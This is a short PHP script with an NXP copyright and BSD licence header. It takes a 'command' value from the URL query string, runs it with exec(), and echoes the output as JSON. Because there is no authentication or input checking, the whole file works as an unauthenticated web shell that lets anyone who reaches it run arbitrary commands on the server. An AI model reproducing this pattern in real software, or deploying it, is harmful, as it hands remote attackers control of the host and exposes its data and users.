<?php
/**
 * Copyright 2023 NXP
 * SPDX-License-Identifier: BSD-3-Clause
 */
	$command = $_GET["command"];
	exec($command, $output);
	echo json_encode($output);
?>